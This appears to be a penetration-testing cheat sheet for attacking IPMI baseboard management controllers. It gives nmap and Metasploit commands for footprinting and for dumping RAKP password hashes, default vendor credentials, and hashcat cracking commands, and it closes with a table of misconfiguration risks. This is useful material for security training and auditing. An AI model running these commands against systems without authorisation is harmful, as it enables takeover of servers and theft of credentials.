# IPMI (Intelligent Platform Management Interface)

**IPMI** is a hardware-based management system used for system monitoring and management, operating independently of the host's BIOS and OS. It functions through a **Baseboard Management Controller (BMC)**, typically an embedded ARM system on the motherboard.

Accessing a BMC is nearly equivalent to **physical access**, allowing an attacker to monitor, reboot, power off, or reinstall the host operating system.

---

### Phase 1: Service Footprinting

Identify systems running IPMI to determine the version and supported authentication levels. IPMI communicates over **port 623 UDP**.

|Tool|Module/Script|Purpose|
|:--|:--|:--|
|**Nmap**|`ipmi-version`|Fingerprints the IPMI version and authentication capabilities.|
|**Metasploit**|`scanner/ipmi/ipmi_version`|Identifies IPMI version and supported authentication/hashing algorithms.|

#### Operational Workflow

1. **Identify the service** using Nmap:
    
    ```
    sudo nmap -sU --script ipmi-version -p 623 <TARGET_IP>
    ```
    
2. **Verify with Metasploit** to check for specific authentication requirements:
    
    ```
    use auxiliary/scanner/ipmi/ipmi_version
    set RHOSTS <TARGET_IP>
    run
    ```
    

---

### Phase 2: Default Credential Testing

BMCs are frequently left with **default configurations**. These credentials may grant access to the web-based management console, SSH, or Telnet.

|Product|Username|Password|
|:--|:--|:--|
|**Dell iDRAC**|`root`|`calvin`|
|**HP iLO**|`Administrator`|Randomized 8-character string (numbers/uppercase)|
|**Supermicro IPMI**|`ADMIN`|`ADMIN`|

---

### Phase 3: Exploiting the RAKP Flaw (IPMI 2.0)

If default credentials fail, exploit a critical flaw in the **IPMI 2.0 RAKP protocol**. The server sends a **salted SHA1 or MD5 hash** of the user's password to the client _before_ authentication is completed.

#### 1. Retrieve Password Hashes

Use Metasploit to request hashes for valid user accounts. This technique works even if the account is secure because the flaw is inherent to the IPMI specification.

```
use auxiliary/scanner/ipmi/ipmi_dumphashes
set RHOSTS <TARGET_IP>
run
```

#### 2. Offline Password Cracking

Once obtained, hashes are cracked offline using **Hashcat (Mode 7300)**.

- **Standard Dictionary Attack:**
    
    ```
    hashcat -m 7300 <HASH_FILE> <WORDLIST>
    ```
    
- **HP iLO Factory Default Mask Attack** (for 8-character uppercase/number strings):
    
    ```
    hashcat -m 7300 <HASH_FILE> -a 3 ?1?1?1?1?1?1?1?1 -1 ?d?u
    ```
    

---

### Attack Implications

- **Host Compromise:** Full control over the hardware allows for remote OS reinstallation or system disruption.
- **Lateral Movement:** Cracked BMC passwords are often **reused** for SSH access to critical servers or other network management tools.
- **Persistence:** Since IPMI is independent of the OS, changes to the operating system will not remove the attacker's access to the BMC.

---

### Dangerous & Misconfigured Settings

|Setting/Issue|Risk|Impact|
|:--|:--|:--|
|**RAKP Protocol Flaw**|**Critical**: Inherent to the IPMI 2.0 specification.|Allows any network user to retrieve password hashes for valid accounts.|
|**Default Credentials**|**High**: Common across Dell, HP, and Supermicro.|Immediate full access to the BMC console and host motherboard.|
|**Lack of Segmentation**|**High**: Direct network access to BMCs from general segments.|Exposes hashes to anyone on the network, leading to potential RCE.|